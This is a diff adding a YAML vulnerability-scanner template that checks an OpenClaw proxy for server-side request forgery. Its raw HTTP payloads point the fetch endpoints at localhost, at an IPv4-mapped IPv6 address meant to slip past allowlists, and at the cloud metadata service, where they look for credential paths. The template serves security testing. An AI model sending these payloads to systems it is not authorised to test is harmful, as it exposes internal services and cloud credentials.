@@ -1,0 +1,117 @@
+id: openclaw-ssrf-proxy-bypass
+
+info:
+  name: OpenClaw SSRF via Proxy Mode DNS Pinning Bypass
+  author: LobsterGuard
+  severity: high
+  description: |
+    Tests whether the OpenClaw fetch/proxy endpoints can be abused to
+    reach internal services. Checks both the /__openclaw/ and
+    /__openclaw__/ fetch API paths with internal target URLs including
+    IPv4-mapped IPv6 addresses (::ffff:127.0.0.1) that may bypass DNS
+    pinning and IP allowlist checks. Also probes configuration for
+    TRUSTED_ENV_PROXY settings that weaken SSRF protections.
+  reference:
+    - https://github.com/lobster-guard/openclaw-security
+  tags: openclaw,ssrf,proxy,ipv6,bypass
+  metadata:
+    chain_id: 45
+
+http:
+  - raw:
+      - |
+        POST /__openclaw/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://127.0.0.1:18789/healthz"}
+
+      - |
+        POST /__openclaw__/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://127.0.0.1:18789/healthz"}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ok"
+          - "healthy"
+          - "status"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /__openclaw/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://[::ffff:127.0.0.1]:18789/healthz"}
+
+      - |
+        POST /__openclaw__/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://[::ffff:127.0.0.1]:18789/healthz"}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ok"
+          - "healthy"
+          - "status"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /__openclaw/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://169.254.169.254/latest/meta-data/"}
+
+      - |
+        POST /__openclaw__/api/fetch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"url":"http://169.254.169.254/latest/meta-data/"}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "security-credentials"
+          - "meta-data"
+        condition: or
+
+websocket:
+  - address: "{{scheme}}://{{Hostname}}/ws"
+    inputs:
+      - data: |
+          {"jsonrpc":"2.0","id":1,"method":"config.get","params":{"path":"server.proxy"}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "TRUSTED_ENV_PROXY"
+          - "proxyUrl"
+          - "noProxy"
+        condition: or
